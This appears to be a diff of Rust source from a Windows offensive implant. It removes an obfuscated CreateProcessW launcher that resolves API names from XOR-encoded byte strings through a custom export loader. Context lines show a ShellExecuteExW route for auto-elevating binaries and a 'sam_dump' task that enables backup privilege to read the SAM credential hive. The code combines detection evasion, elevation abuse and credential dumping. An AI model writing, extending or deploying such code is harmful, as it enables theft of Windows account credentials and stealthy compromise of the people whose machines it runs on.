@@ -58,52 +58,6 @@ unsafe fn adv_fn(base: usize, enc: &[u8]) -> Option<*const u8> {
 }
 
 #[cfg(target_os = "windows")]
-fn create_process_system32(exe_name: &str) -> Result<(), u32> {
-    let k32 = k32_base();
-    if k32 == 0 { return Err(0xDEAD0001); }
-
-    // "CreateProcessW\0" XOR 0x5A
-    let p_cp = unsafe { crate::loader::get_export_by_name(k32,
-        crate::obfs::dec(&[0x19,0x28,0x3F,0x3B,0x2E,0x3F,0x0A,0x28,0x35,0x39,0x3F,0x29,0x29,0x0D,0x5A]).as_ptr()) };
-    // "CloseHandle\0" XOR 0x5A
-    let p_cl = unsafe { crate::loader::get_export_by_name(k32,
-        crate::obfs::dec(&[0x19,0x36,0x35,0x29,0x3F,0x12,0x3B,0x34,0x3E,0x36,0x3F,0x5A]).as_ptr()) };
-    // "GetLastError\0" XOR 0x5A
-    let p_gle = unsafe { crate::loader::get_export_by_name(k32,
-        crate::obfs::dec(&[0x1D,0x3F,0x2E,0x16,0x3B,0x29,0x2E,0x1F,0x28,0x28,0x35,0x28,0x5A]).as_ptr()) };
-
-    type CreateProcessWFn = unsafe extern "system" fn(*const u16, *mut u16, *const u8, *const u8, i32, u32, *const u8, *const u16, *const u8, *mut u8) -> i32;
-    type CloseHandleFn    = unsafe extern "system" fn(isize) -> i32;
-    type GetLastErrorFn   = unsafe extern "system" fn() -> u32;
-
-    let fn_cp: CreateProcessWFn = match p_cp { Some(p) => unsafe { core::mem::transmute(p) }, None => return Err(0xDEAD0002) };
-    let fn_cl: Option<CloseHandleFn> = p_cl.map(|p| unsafe { core::mem::transmute(p) });
-    let fn_gle: Option<GetLastErrorFn> = p_gle.map(|p| unsafe { core::mem::transmute(p) });
-
-    let windir = std::env::var("WINDIR").unwrap_or_else(|_| "C:\\Windows".into());
-    let path: Vec<u16> = format!("{windir}\\System32\\{exe_name}").encode_utf16().chain(core::iter::once(0)).collect();
-
-    // STARTUPINFOW: 104 bytes; set cb = 104 at offset 0, rest zeroed
-    let mut si = [0u8; 104];
-    si[0..4].copy_from_slice(&104u32.to_le_bytes());
-    let mut pi = [0u8; 24];
-
-    let ret = unsafe { fn_cp(path.as_ptr(), core::ptr::null_mut(), core::ptr::null(), core::ptr::null(), 0, 0, core::ptr::null(), core::ptr::null(), si.as_ptr(), pi.as_mut_ptr()) };
-
-    if ret != 0 {
-        if let Some(close) = fn_cl {
-            let hp = isize::from_le_bytes(pi[0..8].try_into().unwrap_or([0;8]));
-            let ht = isize::from_le_bytes(pi[8..16].try_into().unwrap_or([0;8]));
-            if hp != 0 && hp != -1 { unsafe { close(hp); } }
-            if ht != 0 && ht != -1 { unsafe { close(ht); } }
-        }
-        Ok(())
-    } else {
-        let err = fn_gle.map(|f| unsafe { f() }).unwrap_or(0xFFFFFFFF);
-        Err(err)
-    }
-}
-
 // Launch a System32 binary via ShellExecuteExW (routes through elevation service
 // for auto-elevate binaries — CreateProcessW returns ERROR_ELEVATION_REQUIRED for those).
 // "shell32.dll\0" XOR 0x5A = [0x29,0x32,0x3F,0x36,0x36,0x69,0x68,0x74,0x3E,0x36,0x36,0x5A]
@@ -180,8 +134,6 @@ fn k32_base() -> usize {
 
 #[cfg(target_os = "windows")]
 fn sam_dump() -> TaskOutput {
-    use windows_sys::Win32::Foundation::CloseHandle;
-
     enable_backup_privilege();
 
     const HKLM: isize = -2147483646isize;
